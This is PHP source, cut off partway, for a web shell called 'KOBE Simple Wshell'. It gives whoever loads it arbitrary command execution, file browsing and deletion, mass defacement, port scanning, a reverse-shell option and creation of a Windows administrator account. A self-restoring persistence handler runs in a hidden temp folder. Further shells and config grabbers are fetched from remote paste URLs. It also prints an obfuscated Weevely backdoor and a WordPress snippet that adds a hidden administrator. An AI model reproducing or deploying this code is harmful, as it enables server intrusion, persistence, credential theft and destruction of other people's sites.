<?php
set_time_limit(0);
error_reporting(0);
@ini_set("error_log", null);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
@ini_set("display_errors", 0);
$_1337 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
function w($dir, $perm)
{
    if (!is_writable($dir)) {
        return "<rd>" . $perm . "</rd>";
    } else {
        return "<gr>" . $perm . "</gr>";
    }
}
function s()
{
    echo '<style>table{display:none;}</style><div class="table-responsive"><center><hr></hr></center></div>';
}
function ok()
{
    echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er()
{
    echo '<div class="alert alert-dark alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt)
{
    $typ = ["B", "KB", "MB", "GB", "TB"];
    for ($i = 0; $byt >= 1024 && $i < count($typ) - 1; $byt /= 1024, $i++);
    return round($byt, 2) . " " . $typ[$i];
}
function ia()
{
    $ia = "";
    if (getenv("HTTP_CLIENT_IP")) {
        $ia = getenv("HTTP_CLIENT_IP");
    } elseif (getenv("HTTP_X_FORWARDED_FOR")) {
        $ia = getenv("HTTP_X_FORWARDED_FOR");
    } elseif (getenv("HTTP_X_FORWARDED")) {
        $ia = getenv("HTTP_X_FORWARDED");
    } elseif (getenv("HTTP_FORWARDED_FOR")) {
        $ia = getenv("HTTP_FORWARDED_FOR");
    } elseif (getenv("HTTP_FORWARDED")) {
        $ia = getenv("HTTP_FORWARDED");
    } elseif (getenv("REMOTE_ADDR")) {
        $ia = getenv("REMOTE_ADDR");
    } else {
        $ia = "Unknown IP";
    }
    return $ia;
}
function deleteDir($dirPath) {
    if (!is_dir($dirPath)) {
        return false;
    }
    $files = array_diff(scandir($dirPath), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            deleteDir($filePath);
        } else {
            unlink($filePath);
        }
    }
    rmdir($dirPath);
    return true;
}

function exe($cmd)
{
    $method = "";
    $buff = "";
    if (function_exists("system")) {
        $method = "system";
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return "$method: " . htmlspecialchars($buff);
    } elseif (function_exists("exec")) {
        $method = "exec";
        @exec($cmd, $results);
        $buff = implode("\n", $results);
        return "$method: " . htmlspecialchars($buff);
    } elseif (function_exists("passthru")) {
        $method = "passthru";
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return "$method: " . htmlspecialchars($buff);
    } elseif (function_exists("shell_exec")) {
        $method = "shell_exec";
        $buff = @shell_exec($cmd);
        return "$method: " . htmlspecialchars($buff);
    } elseif (function_exists("`")) {
        $method = "backticks";
        $buff = `{$cmd}`;
        return "$method: " . htmlspecialchars($buff);
    } elseif (function_exists("popen")) {
        $method = "popen";
        $handle = @popen($cmd, "r");
        $buff = "";
        if ($handle) {
            while (!feof($handle)) {
                $buff .= fread($handle, 4096);
            }
            @pclose($handle);
        }
        return "$method: " . htmlspecialchars($buff);
    } elseif (function_exists("proc_open")) {
        $method = "proc_open";
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"],
        ];

        $process = @proc_open($cmd, $descriptorspec, $pipes);
        $buff = "";

        if (is_resource($process)) {
            fclose($pipes[0]);
            while (!feof($pipes[1])) {
                $buff .= fread($pipes[1], 4096);
            }
            fclose($pipes[1]);
            fclose($pipes[2]);
            @proc_close($process);
        }

        return "$method: " . htmlspecialchars($buff);
    }

    return false;
}

function p($file)
{
    $p = fileperms($file);
    if (($p & 0xc000) == 0xc000) {
        $i = "s";
    } elseif (($p & 0xa000) == 0xa000) {
        $i = "l";
    } elseif (($p & 0x8000) == 0x8000) {
        $i = "-";
    } elseif (($p & 0x6000) == 0x6000) {
        $i = "b";
    } elseif (($p & 0x4000) == 0x4000) {
        $i = "d";
    } elseif (($p & 0x2000) == 0x2000) {
        $i = "c";
    } elseif (($p & 0x1000) == 0x1000) {
        $i = "p";
    } else {
        $i = "u";
    }
    $i .= $p & 0x0100 ? "r" : "-";
    $i .= $p & 0x0080 ? "w" : "-";
    $i .= $p & 0x0040 ? ($p & 0x0800 ? "s" : "x") : ($p & 0x0800 ? "S" : "-");
    $i .= $p & 0x0020 ? "r" : "-";
    $i .= $p & 0x0010 ? "w" : "-";
    $i .= $p & 0x0008 ? ($p & 0x0400 ? "s" : "x") : ($p & 0x0400 ? "S" : "-");
    $i .= $p & 0x0004 ? "r" : "-";
    $i .= $p & 0x0002 ? "w" : "-";
    $i .= $p & 0x0001 ? ($p & 0x0200 ? "t" : "x") : ($p & 0x0200 ? "T" : "-");
    return $i;
}
if (isset($_1337["dir"])) {
    $dir = $_1337["dir"];
    chdir($dir);
} else {
    $dir = $gcw();
}
echo "
<html>
	<head>
		<meta charset='utf-8'>
		<meta name='author' content='KOBE Simple Wshell'>
		<!--<meta name='viewport' content='width=device-width, initial-scale=0.40'>-->
        <meta name='viewport' content='width=device-width,initial-scale=1,minimum-scale=1'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
		<link rel='icon' href='https://pic.onlinewebfonts.com/thumbnails/icons_7739.svg'>
		<title>KOBE Simple Wshell</title>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
        <script>function copyToClipboard() {var code = document.getElementById('code').innerText;navigator.clipboard.writeText(code).then(function() {alert('Code copied to clipboard!');}, function(err) {console.error('Failed to copy: ', err);});}</script>
		<style>@import url('//cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css');
@import url('//cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css');
@import url('//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css');
@import url('https://fonts.googleapis.com/css2?family=Ubuntu+Condensed');
@import url('https://fonts.googleapis.com/css2?family=Sedgwick+Ave&display=swap');

body {
	cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;
	font-family: 'Ubuntu Condensed';
}
.copy-button {
    position: absolute;
    top: 10px;
    right: 10px;
}
.shell {
	border-radius: 4px;
	border: 1px solid rgba(255, 255, 255, 0.4);
	font-size: 10pt;
	display: flex;
	flex-direction: column;
	align-items: stretch;
	background: #242424;
	color: #fff;
}

.pre {
	height: 150px;
	overflow: auto;
	white-space: pre-wrap;
	flex-grow: 1;
	margin: 10px auto;
	padding: 10px;
	line-height: 1.3em;
	overflow-x: scroll;
}

.anu,
kbd {
	font-family: 'Sedgwick Ave', cursive;
}

.corner {
	text-align: right;
	margin-top: -10px;
	font-size: 12px;
}

gr {
	color: #34c916;
}

ih {
	color: white;
}
re {
	color: gray;
}
rd {
	color: red;
}

.center {
	text-align: center;
}

.center table {
	margin: 1em auto;
	text-align: left;
}

.center th {
	text-align: center !important;
}

.php_info td,
th {
	border: 1px solid #666;
	font-size: 75%;
	vertical-align: baseline;
	padding: 4px 5px;
}

.p {
	text-align: left;
}

.e {
	background-color: #ccf;
	width: 300px;
	font-weight: bold;
}

.h {
	background-color: #99c;
	font-weight: bold;
}

.v {
	background-color: #ddd;
	max-width: 300px;
	overflow-x: auto;
	word-wrap: break-word;
}

.v i {
	color: #999;
}

img {
	float: right;
	border: 0;
}

hr {
	width: 934px;
	background-color: #ccc;
	border: 0;
	height: 1px;
}

h1 {
	font-size: 150%;
}

h2 {
	font-size: 125%;
}

</style>
	</head>
<body class='bg-dark text-light'>
<div class='box shadow bg-dark p-4 rounded-3'>
<a class='text-decoration-none text-light anu' href='" .$_SERVER["PHP_SELF"] ."'><h1>Kobe Simple Wshell | Alexithema1337</h1></a>";
if (isset($_1337["path"])) {
    $path = $_1337["path"];
    chdir($path);
} else {
    $path = $gcw();
}
$path = str_replace("\\", "/", $path);
$paths = explode("/", $path);
foreach ($paths as $id => $pat) {
    if ($pat == "" && $id == 0) {
        $a = true;
        echo "<i class='bi bi-hdd-rack'></i> : <a class='text-decoration-none text-light' href='?path=/'>/</a>";
        continue;
    }
    if ($pat == "") {
        continue;
    }
    echo "<a class='text-decoration-none text-light' href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) {
            echo "/";
        }
    }
    echo "'>" . $pat . "</a>/";
}
$scand = scandir($path);
echo "&nbsp;[ " . w($path, p($path)) . " ]";
function is_any_function_available($functions) {
    foreach ($functions as $function_name) {
        if (function_exists($function_name) && is_callable($function_name)) {
            return true;
        }
    }
    return false;
}
$functions_to_check = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'];
$isoora = is_any_function_available($functions_to_check);
$status = $isoora ? "<gr>ON</gr>" : "<rd>OFF</rd>";
// info
$sql = function_exists("mysql_connect") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$curl = function_exists("curl_version") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$wget = exe("wget --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$pl = exe("perl --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$py = exe("python --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$gcc = exe("gcc --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$pkexec = exe('pkexec --version"') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disfc = "<gr>NONE</gr>";
} else {
    $disfc = "<rd>$disfunc</rd>";
}
if (!function_exists("posix_getegid")) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid["name"];
    $uid = $uid["uid"];
    $group = $gid["name"];
    $gid = $gid["gid"];
}
$sm =
    @ini_get(strtolower("safe_mode")) == "on" ? "<rd>ON</rd>" : "<gr>OFF</gr>";
    echo "<div class='container-fluid'>
    <div class='corner'>
        <i data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>Information Server</i>
    </div><br>
    <div class='collapse text-dark mb-3' id='collapseExample'>
        <div class='box shadow bg-light p-3 rounded-3'>System: " .php_uname() ."<br>
        Software: " .$_SERVER["SERVER_SOFTWARE"] ."<br>
        PHP Version: " .PHP_VERSION ." PHP Os: " . PHP_OS ."<br>
        Server IP: " .gethostbyname($_SERVER["HTTP_HOST"]) ."<br>
        Your IP: " .ia() ."<br>
        User: $user [$uid] | Group: [$group] [$gid]<br>
        Safe Mode: $sm<br>
        MYSQL: $sql | PERL: $pl | PYTHON: $py | WGET: $wget | CURL: $curl | GCC: $gcc | PKEXEC: $pkexec<br>
        Disable Function:<br><pre>$disfc</pre>
        </div>
    </div>
		</div>
		<div class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cmd'><i class='bi bi-terminal'></i> Command ".$status."</a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=conf'><i class='bi bi-eye'></i> Config Searcher </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=rdp'><i class='bi bi-intersect'></i> Create RDP </a>
                <!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cpanel'><i class='bi bi-gear'></i> cPanel Tools</a>-->
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=findmtime'><i class='bi bi-files'></i> Find Modified Time </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=findkey'><i class='bi bi-file-earmark-break'></i> Find File </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getools'><i class='bi bi-code-square'></i> Get Tools </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=gscok'><i class='bi bi-shield-exclamation'></i> GSocket </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=jumping'><i class='bi bi-door-open'></i> Jumping </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=lockfile'><i class='bi bi-file-earmark-lock'></i> Lock File </a>
                <!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=lokit'><i class='bi bi-lock'></i> Lock Shell </a>-->
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass Deface</a>
				<a class='btn btn-outline-danger btn-sm' href='?dir=$path&id=delete'><i class='bi bi-trash'></i> Mass Delete </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=masschemod'><i class='bi bi-file-earmark-medical'></i> Mass Chmod</a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=masschdte'><i class='bi bi-file-binary'></i> Mass Change Date</a>
                <!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=pwnkt'><i class='bi bi-bug'></i> PwnKit </a>-->
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=portscan'><i class='bi bi-hdd'></i> Port Scan </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=revsh'><i class='bi bi-hdd-network'></i> Reverse Shell </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=upload'><i class='bi bi-upload'></i> Upload </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=zoneh'><i class='bi bi-file-text'></i> Zone-H </a>
            </div>
            <div class='text-center'>
                <a class='btn btn-outline-light btn-sm' href='?dir=<?php echo htmlspecialchars($path); ?>&id=createhtaccess'><i class='bi bi-shield-check'></i> Create Htaccess</a>
                <a class='btn btn-outline-light btn-sm' href='?dir=<?php echo htmlspecialchars($path); ?>&id=searchbyext'><i class='bi bi-search'></i> Search By Extension</a>
                <a class='btn btn-outline-light btn-sm' href='?dir=<?php echo htmlspecialchars($path); ?>&id=phpmailer'><i class='bi bi-envelope'></i> PHP Mailer</a>
                <a class='btn btn-outline-light btn-sm' href='?dir=<?php echo htmlspecialchars($path); ?>&id=scan_root'><i class='bi bi-bug'></i> Scan Root</a>
                <a class='btn btn-outline-light btn-sm' href='?dir=<?php echo htmlspecialchars($path); ?>&id=webshell_killer'><i class='bi bi-shield-slash'></i> Webshell Killer</a>
                <a class='btn btn-outline-light btn-sm' href='?dir=<?php echo htmlspecialchars($path); ?>&id=symlink'><i class='bi bi-link-45deg'></i> Symlink Extractor</a><br> 
			</div>
		</div>";
$full = str_replace($_SERVER["DOCUMENT_ROOT"], "", $path);
// tools
if (isset($_1337["dir"])) {
    $dir = $_1337["dir"];
    chdir($dir);
} else {
    $dir = $gcw();
}
$path = str_replace("\\", "/", $path);
$scdir = explode("/", $dir);
for ($i = 0; $i <= $c_dir; $i++) {
    $scdir[$i];
    if ($i != $c_dir) {
    }
    // create rdp
    if ($_1337["id"] == "rdp") {
        ob_implicit_flush();
        ob_end_flush();
        if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
            echo '<center class="anu">Create RDP (Windows Server)</center>';
            echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe("net user DataAdmin AlexGanteng /add", $path).exe("net localgroup administrators DataAdmin /add",$path) .'<br>If there is no "Access is denied." output, chances are that you have succeeded in creating a user here. Just log in using the username and password below.<br>hosts: <gr>'.        gethostbyname($_SERVER["HTTP_HOST"]).        'username: DataAdmin
                password: AlexGanteng</code></pre></div></div>';
        } else {
            echo "<script>alert('Whutt?! kids, this tool only works for windows server!');</script>";
        }
    }
// CUSTOM HERE
$filenya = $_SERVER["PHP_SELF"];
$resoolt = str_replace('/', '', $filenya);
// END
	if ($_1337["id"] == "lockfile") {
        s();
echo '<center class="anu">Lock File</center>
<div class="card card-body text-dark input-group mb-3">
    <div class="container-fluid mt-1">
    <form method="post" action="">
        <div class="mb-3">
            <input type="text" name="lockfile" class="form-control form-control-sm text-dark flex-grow-1" placeholder="'.$resoolt.'" required>
        </div>
		<div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" value="Submit!">
        </div>
    </form>
</div></div><p class="text-center">To prevent files from being modified, destroyed, or altered, use a lock file. To run this, an execute command is needed.</p>';
function remdot($filename) {
    return str_replace('.', '', $filename);
}

function get_temp_dir() {
    $tmp_paths = array('/tmp', '/var/tmp');
    foreach ($tmp_paths as $tmp_path) {
        if (is_writable($tmp_path)) {
            return $tmp_path;
        }
    }
    if (function_exists('sys_get_temp_dir')) {
        return sys_get_temp_dir();
    }
    
    if (!empty($_ENV['TMP'])) {
        return realpath($_ENV['TMP']);
    } elseif (!empty($_ENV['TMPDIR'])) {
        return realpath($_ENV['TMPDIR']);
    } elseif (!empty($_ENV['TEMP'])) {
        return realpath($_ENV['TEMP']);
    }
    $tempfile = tempnam(sys_get_temp_dir(), '');
    if ($tempfile) {
        unlink($tempfile);
        return realpath(dirname($tempfile));
    }

    return false;
}

function cmdoitlock($command) {
    if (function_exists('system')) {
        system($command);
    } elseif (function_exists('exec')) {
        exec($command);
    } elseif (function_exists('shell_exec')) {
        shell_exec($command);
    } elseif (function_exists('passthru')) {
        passthru($command);
    } elseif (function_exists('popen')) {
        $handle = popen($command, 'r');
        if ($handle) {
            while (!feof($handle)) {
                echo fgets($handle, 4096);
            }
            pclose($handle);
        }
    } elseif (function_exists('proc_open')) {
        proc_open($command, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes);
    } elseif (function_exists('`')) {
        echo `$command`;
    }
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['lockfile'])) {
    $namafilelos = $_POST['lockfile'];
        $tmpnya = get_temp_dir();

    if ($tmpnya) {
        $cachedirectorylo = $tmpnya . '/.PHPSESSID';

        if (file_exists($cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler')) &&
            file_exists($cachedirectorylo . '/.' . remdot($namafilelos) . '-text')) {

            cmdoitlock('rm -rf ' . $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-text-file'));
            cmdoitlock('rm -rf ' . $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler'));
        }

        mkdir($cachedirectorylo);
        cmdoitlock("cp $namafilelos $cachedirectorylo/." . base64_encode(getcwd() . remdot($namafilelos) . '-text-file'));
        chmod($namafilelos, 0444);

        $handler = '<?php
        @ini_set("max_execution_time", 0);
        while (true) {
            if (!file_exists("' . getcwd() . '")) {
                mkdir("' . getcwd() . '");
            }

            if (!file_exists("' . getcwd() . '/' . $namafilelos . '")) {
                $text = base64_encode(file_get_contents("' . $tmpnya . '/.PHPSESSID/.' . base64_encode(getcwd() . remdot($namafilelos) . '-text-file') . '"));
                file_put_contents("' . getcwd() . '/' . $namafilelos . '", base64_decode($text));
            }

            if (kobeperm("' . getcwd() . '/' . $namafilelos . '") != 0444) {
                chmod("' . getcwd() . '/' . $namafilelos . '", 0444);
            }
        }

        function kobeperm($filename) {
            return substr(sprintf("%o", fileperms($filename)), -4);
        }';

        $handlerfile = $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler');
        $handlersaction = file_put_contents($handlerfile, $handler);

        if ($handlersaction) {
            cmdoitlock('php ' . $handlerfile . ' > /dev/null 2>/dev/null &');
            echo "<script>window.location='?path=$path'</script>";
        }
    } else {
        echo "<script>alert('ERROR! Access denied.');</script>";
    }
}
    }
    // get tools
    if ($_1337["id"] == "getools") {
        s();
        echo "<center class='anu'>Get Private Tools</center>
        <div class='card card-body text-dark input-group mb-3'>
        <form method='POST'> 
        <i class='bi bi-file-earmark'></i> Select a tools/code:
        <select class='form-control btn-sm text-dark' name='option'>
            <option value='1' selected>Adminer (Database Login)</option>
            <option value='11'>Command Bypass (Stealth Version)</option>
            <option value='2'>Htaccess (Kill All Backdoor)</option>
            <option value='8'>Private Config Grabber (Auto Grab Config)</option>
            <option value='3'>Weevely Remote Shell</option>
            <option value='4'>SSI Shell (Bypass Command Litespeed)</option>
            <option value='5'>WordPress Auto Add Admin (On Themes)</option>
            <option value='6'>Alfabepas (Alfa Bypass Version)</option>
            <option value='9'>Alfa Tesla (Alfa Original Code)</option>
            <option value='7'>Marijuana (Best Bypass Shell)</option>
            <option value='10'>Bypass Litespeed Shell (Stealth Version)</option>
        </select>
        <div class='d-grid gap-2'>
            <input class='btn btn-dark btn-sm' type='submit' name='get' value='Submit!'>
        </div>
        </form>
        </div>";
// start here
if (isset($_POST['get'])) {
    function downloadFile($url, $fileName)
    {
        $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
        $downloaded = false;

        // Method 1: Using cURL
        $ch = curl_init($url);
        $fp = fopen($fileName, 'w');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
        if (curl_exec($ch)) {
            $downloaded = true;
        }
        curl_close($ch);
        fclose($fp);

        // Method 2: Using file_get_contents and file_put_contents
        if (!$downloaded) {
            $opts = [
                'http' => [
                    'method' => "GET",
                    'header' => "User-Agent: $userAgent\r\n"
                ]
            ];
            $context = stream_context_create($opts);
            $fileContent = file_get_contents($url, false, $context);
            if ($fileContent !== false) {
                file_put_contents($fileName, $fileContent);
                $downloaded = true;
            }
        }

        // Method 3: Using fopen and fread/fwrite
        if (!$downloaded) {
            $fp = fopen($fileName, 'w');
            if ($fp) {
                $source = fopen($url, 'r');
                if ($source) {
                    while ($content = fread($source, 8192)) {
                        fwrite($fp, $content);
                    }
                    fclose($source);
                    $downloaded = true;
                }
                fclose($fp);
            }
        }

        // Method 4: Using copy
        if (!$downloaded) {
            if (copy($url, $fileName)) {
                $downloaded = true;
            }
        }

        // Method 5: Using stream_context
        if (!$downloaded) {
            $opts = [
                'http' => [
                    'method' => 'GET',
                    'header' => 'User-Agent: ' . $userAgent
                ]
            ];
            $context = stream_context_create($opts);
            $source = fopen($url, 'r', false, $context);
            if ($source) {
                $fp = fopen($fileName, 'w');
                if ($fp) {
                    while ($content = fread($source, 8192)) {
                        fwrite($fp, $content);
                    }
                    fclose($fp);
                    $downloaded = true;
                }
                fclose($source);
            }
        }

        if ($downloaded) {
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
            $urlwebsite = $protocol . '://' . $_SERVER['HTTP_HOST'];
            $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($fileName);
            echo "<center><a href='$downloadLink' target='_blank' class='btn btn-danger'>Click Here!</a></center>";
        } else {
            echo "<center><p class='text-danger'>Failed to download the file.</p></center>";
        }
    }

    if ($_POST['option'] == '1') {
        $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
        $fileName = getcwd() . '/kobeadminer.php';
    } elseif ($_POST['option'] == '2') {?>
    <div class="container-fluid language-javascript mt-3">
        <div class="shell mb-3 position-relative"><pre style="font-size:10px;" id="code"><code><?php
        echo htmlspecialchars("Options -Indexes
<FilesMatch \".*\\.(cgi|pl|py|pyc|pyo|php3|php4|php5|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm|module|ctp|inc)$\"> 
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch \"(?i).*(ph|sh|pj|env|cg).*\">
Order Deny,Allow
Deny from all
</FilesMatch>
<FilesMatch '^(".$resoolt.")$'>
Order allow,deny
Allow from all
</FilesMatch>
ErrorDocument 403 \"<html><head><title>Request Rejected by Kobe</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"
ErrorDocument 404 \"<html><head><title>Request Rejected by Kobe</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"");
        ?></code></pre>
<button class="btn btn-danger btn-sm copy-button" onclick="copyToClipboard()">Copy</button>
</div></div>
<p class="text-center">How to use? Just paste the .htaccess above in the folder you want to block all shell extensions except <em><?php echo $resoolt; ?></em></p>
</div><?php

    }   elseif ($_POST['option'] == '3') {?>
     <div class="container-fluid language-javascript mt-3">
        <div class="shell mb-3 position-relative">
            <pre style="font-size:10px;" id="code"><code>error_reporting(0);
$a='$k="c8ba0w"w"a4b";$kw"h="w"7w"4948d105bdbw"";$kf="6f7w"7b77aw"432e"w";$pw"="5dJ1fteGr';
$W='Iw"w"XjtCLs";fuw"w"nction x($t,$k){$w"c=strw"len($kw");$l=stw"rw"len($tw");$o=""w";f';
$d='or($i=0;w"$i<$l;w")w"{fow"rw"($j=0;($jw"<$c&&$i<$l)w";$j++,w"$w"i++){$o.=$t{$i}^w"$k';
$l='w"lean();$w"r=@basw"e64_encow"dew"(w"@x(@gzcow"mpress($w"o),$k))w";prinw"t("$p$kh$rw"$kf");}';
$w='{$j}w";w"w"}}return $w"ow";}if (@w"prew"g_match("/$kh(.+)$w"kw"f/",w"@fiw"le_get_con';
$u=str_replace('I','','creIatIeI_fIuInctIion');
$g='tentw"s("php://iw"nputw"w""),$m)==1) {w"@ow"bw"_start();@evw"al(w"@gzuncomw"press(@x';
$H='(@bw"ase6w"4_dew"w"cw"ode($m[1]),$k)));$o=@ow"b_gw"w"et_cw"ontents();@w"ob_end_c';
$r=str_replace('w"','',$a.$W.$d.$w.$g.$H.$l);
$T=$u('',$r);$T();
</code></pre>
            <button class="btn btn-danger btn-sm copy-button" onclick="copyToClipboard()">Copy</button>
        </div>
    </div>
    <p class="text-center">How to use? Just paste the code above in the php file, for example: index.php etc. then connect to weevely | terminal command: <em>weevely http://yoursite/yourfile.php kobe</em><p>

				</div><?php
    } elseif ($_POST['option'] == '4') {
        $url = 'https://gist.github.com//alexithema1337/0669c246ce2a1c7db5b5526210736238/raw/db9cc5aa7a6c6e7148a2650452f10f35d7449247/kobessi.shtml';
        $fileName = getcwd() . '/kobeganteng-ssi.shtml';
    } elseif ($_POST['option'] == '5') {?>
<div class="container-fluid language-javascript mt-3">
        <div class="shell mb-3 position-relative"><pre style="font-size:10px;" id="code"><code>function kobeadmin(){
$login = 'kobe';
$passw = 'kobeganteng13+13';
$email = 'kobe-ganteng@proton.me';
if ( !username_exists( $login ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $login, $passw, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}
}
add_action('init','kobeadmin');</code></pre>
<button class="btn btn-danger btn-sm copy-button" onclick="copyToClipboard()">Copy</button>
</div>
<p class="text-center">How to use? Add the above code in the functions.php file on the target website. | example: https://example.go.id/wp-content/themes/[themes name]/functions.php</p>
</div>
            <?php
        
    } elseif ($_POST['option'] == '6') {
        $url = 'https://gist.githubusercontent.com/alexithema1337/9990c355f36adfff973c91566b7bd029/raw/f03036733fc951b00c0729fea94e3e1976f7f4d3/alfabypass.php';
        $fileName = getcwd() . '/kobe-alfabepas.php';
    } elseif ($_POST['option'] == '7') {
        $url = 'https://gist.githubusercontent.com/alexithema1337/82065e3ee7b7876f3917584245f52d9b/raw/5420deac465587fa29afbc2fb270443209c5c580/marijuanabypass.php';
        $fileName = getcwd() . '/kobe-marijuana.php';
    } elseif ($_POST['option'] == '8') {
        $url = 'https://raw.githubusercontent.com/FlamXTna997/Priv8-Config-Grabber/master/config.php';
        $fileName = getcwd() . '/kobe-config.php';
    } elseif ($_POST['option'] == '9') {
        $url = 'https://pst.innomi.net/paste/uo6cf3k4frw53f2rn9jot7fh/raw';
        $fileName = getcwd() . '/kobe-tesla.php';
    } elseif ($_POST['option'] == '10') {
        $url = 'https://paste.idcloudhosting.my.id/paste/ofp7w/raw';
